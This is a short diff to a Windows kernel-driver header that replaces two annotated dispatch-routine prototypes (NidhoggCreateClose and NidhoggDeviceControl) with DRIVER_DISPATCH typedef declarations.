@@ -12,10 +12,5 @@
 #include "NetworkHandler.h"
 #include "ScriptManager.h"
 
-_IRQL_requires_max_(DISPATCH_LEVEL)
-_IRQL_requires_same_
-NTSTATUS NidhoggCreateClose(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP Irp);
-
-_IRQL_requires_max_(DISPATCH_LEVEL)
-_IRQL_requires_same_
-NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP Irp);
+DRIVER_DISPATCH NidhoggCreateClose;
+DRIVER_DISPATCH NidhoggDeviceControl;
